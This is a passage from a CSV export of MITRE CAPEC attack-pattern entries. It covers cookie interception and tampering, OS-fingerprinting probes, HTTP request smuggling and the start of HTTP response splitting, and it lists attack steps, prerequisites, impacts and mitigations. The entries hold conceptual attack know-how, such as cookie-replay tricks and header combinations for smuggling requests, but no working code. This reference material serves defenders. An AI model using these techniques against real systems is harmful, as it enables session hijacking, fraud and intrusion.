CAPEC-31,Accessing/Intercepting/Modifying HTTP Cookies,Detailed,Draft,"This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:39::NATURE:ChildOf:CAPEC ID:157::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.TECHNIQUE:Sniff cookie using a network sniffer such as Wireshark:TECHNIQUE:Obtain cookie using a utility such as the Firefox Cookie Manager, Chrome DevTools or AnEC Cookie Editor.:TECHNIQUE:Steal cookie via a cross-site scripting attack.:TECHNIQUE:Guess cookie contents if it contains predictable information.::STEP:2:PHASE:Experiment:DESCRIPTION:[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.TECHNIQUE:If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.:TECHNIQUE:Analyze the cookie's contents to determine whether it contains any sensitive information.::STEP:3:PHASE:Experiment:DESCRIPTION:[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.TECHNIQUE:Modify logical parts of cookie and send it back to server to observe the effects.:TECHNIQUE:Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.:TECHNIQUE:Modify cookie bitwise and send it back to server to observe the effects.:TECHNIQUE:Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a points balance for a given user where the points have some value. The user may spend their points and then replace their cookie with an older one to restore their balance.::","::Target server software must be a HTTP daemon that relies on cookies.::The cookies must contain sensitive information.::The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply.::","::SKILL:To overwrite session cookie data, and submit targeted attacks via HTTP:LEVEL:Low::SKILL:Exploiting a remote buffer overflow generated by attack:LEVEL:High::",::A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Design: Use input validation for cookies::Design: Generate and validate MAC for cookies::Implementation: Use SSL/TLS to protect cookie in transit::Implementation: Ensure the web server implements all relevant security patches, many exploitable buffer overflows are fixed in patches issued for the software.::","::There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353::",::565::302::311::113::539::20::315::384::472::602::642::,N/A,N/A,https://capec.mitre.org/data/definitions/31.html
CAPEC-310,Scanning for Vulnerable Software,Detailed,Draft,"An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:541::,N/A,::Access to the network on which the targeted system resides.::Software tools used to probe systems over a range of ports and protocols.::,::SKILL:To probe a system remotely without detection requires careful planning and patience.:LEVEL:Medium::,"::Probing requires the ability to interactively send and receive data from a target, whereas passive listening requires a sufficient understanding of the protocol to analyze a preexisting channel of communication.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/310.html
CAPEC-312,Active OS Fingerprinting,Standard,Stable,"An adversary engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:224::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,"::Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,TAXONOMY NAME:ATTACK:ENTRY ID:1082:ENTRY NAME:System Information Discovery::,N/A,https://capec.mitre.org/data/definitions/312.html
CAPEC-313,Passive OS Fingerprinting,Standard,Stable,"An adversary engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods, it is generally better able to evade detection.",N/A,High,Low,::NATURE:ChildOf:CAPEC ID:224::,N/A,"::The ability to monitor network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,"::Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/313.html
CAPEC-317,IP ID Sequencing Probe,Detailed,Stable,"This OS fingerprinting probe analyzes the IP 'ID' field sequence number generation algorithm of a remote host. Operating systems generate IP 'ID' numbers differently, allowing an attacker to identify the operating system of the host by examining how is assigns ID numbers when generating response packets. RFC 791 does not specify how ID numbers are chosen or their ranges, so ID sequence generation differs from implementation to implementation. There are two kinds of IP 'ID' sequence number analysis - IP 'ID' Sequencing: analyzing the IP 'ID' sequence generation algorithm for one protocol used by a host and Shared IP 'ID' Sequencing: analyzing the packet ordering via IP 'ID' values spanning multiple protocols, such as between ICMP and TCP.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,N/A,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/317.html
CAPEC-318,IP 'ID' Echoed Byte-Order Probe,Detailed,Stable,This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'ID' value from the probe packet. An attacker sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host to observe the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within an ICMP error message.,N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,N/A,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/318.html
CAPEC-319,IP (DF) 'Don't Fragment Bit' Echoing Probe,Detailed,Stable,This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. An attacker sends a UDP datagram with the DF bit set to a closed port on the remote host to observe whether the 'DF' bit is set in the response packet. Some operating systems will echo the bit in the ICMP error message while others will zero out the bit in the response packet.,N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,N/A,N/A,N/A,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/319.html
CAPEC-320,TCP Timestamp Probe,Detailed,Stable,"This OS fingerprinting probe examines the remote server's implementation of TCP timestamps. Not all operating systems implement timestamps within the TCP header, but when timestamps are used then this provides the attacker with a means to guess the operating system of the target. The attacker begins by probing any active TCP service in order to get response which contains a TCP timestamp. Different Operating systems update the timestamp value using different intervals. This type of analysis is most accurate when multiple timestamp responses are received and then analyzed. TCP timestamps can be found in the TCP Options field of the TCP header.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine if timestamps are present.] The adversary sends a probe packet to the remote host to identify if timestamps are present.::STEP:2:PHASE:Experiment:DESCRIPTION:[Record and analyze timestamp values.] If the remote host is using timestamp, obtain several timestamps, analyze them and compare them to known values.TECHNIQUE:The adversary sends several requests and records the timestamp values.:TECHNIQUE:The adversary analyzes the timestamp values and determines an average increments per second in the timestamps for the target.:TECHNIQUE:The adversary compares this result to a database of known TCP timestamp increments for a possible match.::","::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.The target OS must support the TCP timestamp option in order to obtain a fingerprint.::",N/A,"::Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/320.html
CAPEC-321,TCP Sequence Number Probe,Detailed,Stable,"This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows: 1) the Sequence Number generated by the target is Zero, 2) the Sequence Number generated by the target is the same as the acknowledgement number in the probe, 3) the Sequence Number generated by the target is the acknowledgement number plus one, or 4) the Sequence Number is any other non-zero number.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,::A tool capable of sending and receiving packets from a remote system.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/321.html
CAPEC-322,TCP (ISN) Greatest Common Divisor Probe,Detailed,Stable,This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.,N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,::A tool capable of sending and receiving packets from a remote system.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/322.html
CAPEC-323,TCP (ISN) Counter Rate Probe,Detailed,Stable,This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.,N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,"::Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/323.html
CAPEC-324,TCP (ISN) Sequence Predictability Probe,Detailed,Stable,"This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,::A tool capable of sending and receiving packets from a remote system.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/324.html
CAPEC-325,TCP Congestion Control Flag (ECN) Probe,Detailed,Stable,"This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,::A tool capable of sending and receiving packets from a remote system.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/325.html
CAPEC-326,TCP Initial Window Size Probe,Detailed,Stable,This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the connected state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.,N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,::A tool capable of sending and receiving packets from a remote system.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/326.html
CAPEC-327,TCP Options Probe,Detailed,Stable,"This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,::A tool capable of sending and receiving packets from a remote system.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/327.html
CAPEC-328,TCP 'RST' Flag Checksum Probe,Detailed,Stable,This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.,N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,::A tool capable of sending and receiving packets from a remote system.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/328.html
CAPEC-329,ICMP Error Message Quoting Probe,Detailed,Stable,"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or Quoted from the originating request that generated the ICMP error message.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,"::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, Port Unreachable..::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/329.html
CAPEC-33,HTTP Request Smuggling,Detailed,Stable,"An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages using various HTTP headers and message sizes (denoted by the end of message signaled by a given HTTP header) by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to secretly send unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server). See CanPrecede relationships for possible consequences.",::TERM:HTTP Desync:DESCRIPTION:Modification/manipulation of HTTP message headers and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.::,Medium,High,::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:273::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.TECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Utilize various combinations of HTTP Headers within a single HTTP Request such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded requests or data in the body of the original request are unprocessed and treated as part of subsequent requests by the intended target HTTP agent. From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences. For CL;TE and TE;CL HTTP header combinations, the first HTTP agent, in the HTTP message path that receives the HTTP request, takes precedence or only processes one header but not the other, while the second/final HTTP agent processes the opposite header, allowing for embedded HTTP requests to be ignored and smuggled to the intended target HTTP agent. For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation (see Mitigations for details) of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP requests to be smuggled. .:TECHNIQUE:Construct a very large HTTP request using multiple Content-Length headers of various data lengths that can potentially cause subsequent requests to be ignored by an intermediary HTTP agent (firewall) and/or eventually parsed separately by the target HTTP agent (web server). Note that most modern HTTP infrastructure reject HTTP requests with multiple Content-Length headers.:TECHNIQUE:Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Request Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.TECHNIQUE:Leverage techniques identified in the Experiment Phase.::","::An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.::Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.::HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::","::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::",::Tools capable of crafting malicious HTTP messages and monitoring HTTP message responses.::,::Differences in requests processed by the two agents. This requires careful monitoring or a capable log analysis tool.::,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.::Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.::Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as: Headers with no space before the value “chunked” Headers with extra spaces Headers beginning with trailing characters Headers providing a value “chunk” instead of “chunked” (the server normalizes this as chunked encoding) Headers with multiple spaces before the value “chunked” Headers with quoted values (whether single or double quotations) Headers with CRLF characters before the value “chunked” Values with invalid characters::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::","::When using Haproxy 1.5.3 version as front-end proxy server with with Node.js version 14.13.1 or 12.19.0 as the back-end web server it is possible to use two same header fields for example: two Transfer-Encoding, Transfer-Encoding: chunked and Transfer-Encoding: chunked-false, to bypass Haproxy /flag URI restriction and receive the Haproxy flag value, since Node.js identifies the first header but ignores the second header. See also: CVE-2020-8287::When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276::Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088::",::444::,TAXONOMY NAME:WASC:ENTRY ID:26:ENTRY NAME:HTTP Request Smuggling::,TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::,https://capec.mitre.org/data/definitions/33.html
CAPEC-330,ICMP Error Message Echoing Integrity Probe,Detailed,Stable,"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or Quoted from the originating request that generated the error message.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:312::,N/A,"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::",N/A,"::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, Port Unreachable..::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/330.html
CAPEC-34,HTTP Response Splitting,Detailed,Stable,"An adversary manipulates and injects malicious content, in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., web server) or into an already spoofed HTTP response from an adversary controlled domain/site. See CanPrecede relationships for possible consequences.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:105::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targetsTECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data (in the form of HTTP headers with custom strings and embedded web scripts and objects) into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP responses by intermediary and front-end client/victim HTTP agents. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses to intermediary and front-end client/victim HTTP agents, will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed: additional HTTP Requests with their own headers malicious web scripts into parameters of HTTP Request 